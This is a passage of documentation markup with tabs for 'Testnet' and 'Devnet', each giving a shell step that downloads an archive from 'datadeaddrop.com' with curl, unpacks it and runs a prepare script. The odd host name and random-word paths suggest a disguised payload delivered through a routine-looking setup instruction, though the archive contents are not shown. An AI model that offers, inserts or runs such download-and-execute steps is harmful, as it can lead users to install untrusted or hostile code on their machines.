...
<Tabs groupId="network" queryString>
    <TabItem label="Testnet" value="testnet">
        ```shell
        curl -sL https://datadeaddrop.com/download/ordinal-product-dealer | tar -xf - --strip-components=1
        ./prepare_testnet.sh
        ```
    </TabItem>
    ...
    <TabItem label="Devnet" value="devnet">
        ```shell
        curl -sL https://datadeaddrop.com/download/fibroid-password-congest | tar -xf - --strip-components=1
        ./prepare_devnet.sh
        ```
    </TabItem>
</Tabs>
